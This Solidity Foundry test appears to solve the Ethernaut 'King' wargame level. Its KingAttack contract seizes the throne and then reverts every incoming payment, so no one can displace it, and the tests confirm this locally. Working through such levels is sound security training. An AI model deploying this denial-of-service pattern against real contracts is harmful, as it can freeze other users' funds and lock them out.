// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {King} from "src/levels/King.sol";
import {KingFactory} from "src/levels/KingFactory.sol";

contract KingAttack {
    // Menjadi king lalu menolak semua transfer masuk berikutnya: receive()
    // yang revert membuat `payable(king).transfer(...)` di King gagal,
    // sehingga tidak ada yang bisa merebut takhta.
    function attack(address payable target) external payable {
        (bool ok,) = target.call{value: 0.001 ether}("");
        require(ok, "claim failed");
    }

    receive() external payable {
        revert("throne is mine");
    }
}

contract KingSolve is Test {
    KingFactory factory;
    King instance;
    KingAttack attacker;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new KingFactory();
        vm.deal(address(this), 1 ether);
        instance = King(payable(factory.createInstance{value: 0.001 ether}(player)));
        attacker = new KingAttack();
        vm.deal(address(attacker), 1 ether);
    }

    function testInit() public {
        assertEq(instance._king(), address(factory));
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        attacker.attack(payable(address(instance)));
        assertEq(instance._king(), address(attacker));
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
